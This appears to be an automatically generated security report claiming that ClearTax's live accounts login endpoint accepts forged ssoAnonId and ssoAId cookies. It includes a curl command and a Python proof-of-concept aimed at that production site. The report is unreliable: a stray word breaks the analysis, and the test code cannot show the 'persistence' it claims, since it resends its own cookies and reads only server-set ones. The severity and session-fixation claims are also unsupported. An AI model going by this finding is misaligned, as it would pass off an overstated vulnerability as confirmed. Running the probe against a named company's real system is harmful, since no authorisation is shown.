# Cookie Security Vulnerability - Missing Cookie Overwrite Protection

**ID:** vuln-0005
**Severity:** MEDIUM
**Found:** 2026-03-18 13:27:30 UTC
**Target:** https://accounts.cleartax.in/v2
**Endpoint:** /v2
**Method:** GET
**CWE:** CWE-565
**CVSS:** 5.4

## Description

The ClearTax authentication system (accounts.cleartax.in/v2) accepts malicious cookie values without validation or overwrite protection. Attackers can set arbitrary values for ssoAnonId and ssoAId cookies, which the server accepts without proper validation or regeneration of secure tokens.

## Impact

This vulnerability allows attackers to:
- Set malicious cookie values that persist through sessions
- Potentially manipulate session state or analytics tracking
- Bypass server-side cookie validation checks
- Perform session fixation attacks by setting predictable cookie values

The lack of cookie validation creates a trust boundary issue where client-provided cookie values are accepted without server-side verification.

## Technical Analysis

Testing revealed that the server accepts malformed and malicious cookie values without proper validation:
 confident
1. **Malicious Cookie Acceptance**: Server accepted 'malicious_value_attempt' for ssoAnonId cookie
2. **No Validation**: No server-side validation of cookie format or content
3. **Persistence**: Malicious cookies persist through subsequent requests
4. **No Regeneration**: Server does not automatically regenerate secure tokens when invalid cookies are detected

The ssoAnonId cookie should be a UUID format but accepts arbitrary strings, indicating missing input validation and potential session management flaws.

## Proof of Concept

To reproduce:
1. Set malicious cookies: `curl -H "Cookie: ssoAnonId=malicious_value; ssoAId=fake_analytics" https://accounts.cleartax.in/v2 -I`
2. Observe 302 response with cookies accepted
3. Follow up request shows cookies persist without regeneration
4. Verify server does not validate cookie format or regenerate secure tokens

```
# Proof of Concept: Cookie Overwrite Vulnerability
import requests

def test_cookie_overwrite():
    base_url = "https://accounts.cleartax.in/v2"
    
    # Set malicious cookies
    headers = {
        'Cookie': 'ssoAnonId=malicious_attacker_controlled_value; ssoAId=fake_analytics_data'
    }
    
    # First request with malicious cookies
    response1 = requests.get(base_url, headers=headers, allow_redirects=False)
    print("First request status:", response1.status_code)
    print("Cookies set:", dict(response1.cookies))
    
    # Second request to check persistence
    response2 = requests.get(base_url, headers=headers, allow_redirects=False)
    print("Second request status:", response2.status_code)
    print("Cookies maintained:", dict(response2.cookies))
    
    # Check if malicious values persist
    cookies = response2.cookies
    if 'ssoAnonId' in cookies and cookies['ssoAnonId'] == 'malicious_attacker_controlled_value':
        print("✅ VULNERABLE: Malicious cookie value accepted and persisted")
    else:
        print("✅ SECURE: Server rejected or regenerated malicious cookie")

# Execute test
test_cookie_overwrite()
```

## Remediation

1. **Implement Cookie Validation**: Validate cookie format (UUID for ssoAnonId) on server side
2. **Automatic Regeneration**: Regenerate cookies when invalid formats are detected
3. **Signature Verification**: Add cryptographic signatures to cookies to prevent tampering
4. **Input Sanitization**: Reject malformed cookie values with proper error handling
5. **Security Headers**: Implement stricter cookie policies with proper flags
6. **Logging**: Log cookie validation failures for security monitoring
7. **Regular Audits**: Conduct periodic security testing of cookie handling
